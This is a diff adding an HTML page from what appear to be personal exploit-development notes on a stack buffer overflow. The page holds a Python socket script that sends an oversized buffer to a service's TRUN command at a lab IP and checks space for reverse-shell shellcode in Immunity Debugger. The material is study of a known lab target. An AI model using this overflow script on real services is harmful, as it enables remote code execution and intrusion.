@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>Expanding the Space and Obtaining a Safe Padding</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+</head>
+<body>
+<div class='page'><h1 class='title'>Expanding the Space and Obtaining a Safe Padding</h1><br/><br />we have to find out how much space we have for our shellcode, which then executes the reverse shell.<br />We need to find space for our shellcode, keep in mind a typical windows payload is usually about 350-450 bytes.<br /><br /><br />Change the value of <br />• eip_address_location with the value found in the chapter “Find the Offset”<br />• s.connect with address and port of the service<br />• s.send with the value of the command of the service<br /><br /><div class="codebox"><div class="codebox">#!/usr/bin/python<br />import&nbsp;socket<br />import&nbsp;sys<br />from&nbsp;time&nbsp;import&nbsp;sleep<br /><br />eip_address_location&nbsp;=&nbsp;2003<br />buffer&nbsp;=&nbsp;&#39;A&#39;&nbsp;*&nbsp;eip_address_location&nbsp;+&nbsp;&#39;B&#39;&nbsp;*&nbsp;4&nbsp;+&nbsp;&#39;C&#39;&nbsp;*&nbsp;500<br /><br />try:<br />&nbsp;&nbsp;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br />&nbsp;&nbsp;s.settimeout(2)<br />&nbsp;&nbsp;s.connect((&#39;192.168.1.118&#39;,9999))<br />&nbsp;&nbsp;s.recv(1024)<br />&nbsp;&nbsp;<br />&nbsp;&nbsp;print&nbsp;&#39;[*]&nbsp;Sending&nbsp;buffer.&#39;<br />&nbsp;&nbsp;s.send(&#39;TRUN&nbsp;/.:/&#39;&nbsp;+&nbsp;buffer&nbsp;+&nbsp;&#39;\r\n&#39;)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#target&nbsp;the&nbsp;TRUN&nbsp;command<br />&nbsp;&nbsp;s.close()<br />&nbsp;&nbsp;<br />except:<br />&nbsp;&nbsp;print&nbsp;&#39;[*]&nbsp;Could&nbsp;not&nbsp;connect&nbsp;to&nbsp;target,&nbsp;exiting.&#39;<br />&nbsp;&nbsp;sys.exit<span style="color:#000000;font-weight:400">()</span></div></div><br /><br />In Immunity Debugger right click on the ESP register and “Follow in Dump” <br />    <a href=""><img src="images/2140-1.png" alt="images/2140-1.png" /></a><br />    This show that we have plenty of space</div>
+</body>
+</html>
